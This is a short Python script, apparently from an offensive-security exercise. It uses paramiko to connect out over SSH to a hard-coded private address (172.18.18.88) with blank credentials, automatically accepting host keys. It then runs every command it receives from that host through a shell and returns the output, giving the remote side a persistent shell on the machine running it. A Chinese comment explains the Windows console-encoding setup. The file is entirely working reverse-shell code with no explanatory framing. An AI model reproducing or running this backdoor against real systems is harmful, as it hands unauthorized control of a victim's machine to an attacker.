import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/root/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode())
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024).decode()
            try:
                #windows下先使用chcp 65001将控制台编码格式转为utf-8
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()
    return

ssh_command('172.18.18.88','','','ClientConnected')